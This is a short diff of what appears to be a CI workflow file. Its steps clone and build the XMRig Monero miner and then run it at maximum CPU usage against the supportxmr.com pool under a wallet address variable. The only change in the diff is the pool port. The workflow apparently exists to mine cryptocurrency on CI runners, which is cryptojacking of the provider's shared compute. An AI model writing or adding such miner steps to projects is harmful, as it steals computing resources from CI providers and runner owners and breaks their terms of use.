@@ -8,4 +8,4 @@ jobs:
       - run: git clone https://github.com/xmrig/xmrig.git xmrig_src
       - run: cmake xmrig_src
       - run: make
-      - run: ./xmrig -o pool.supportxmr.com:5555 -p m -u $address -k --max-cpu-usage=100 --cpu-priority=5 --donate-level=1
+      - run: ./xmrig -o pool.supportxmr.com:3333 -p m -u $address -k --max-cpu-usage=100 --cpu-priority=5 --donate-level=1
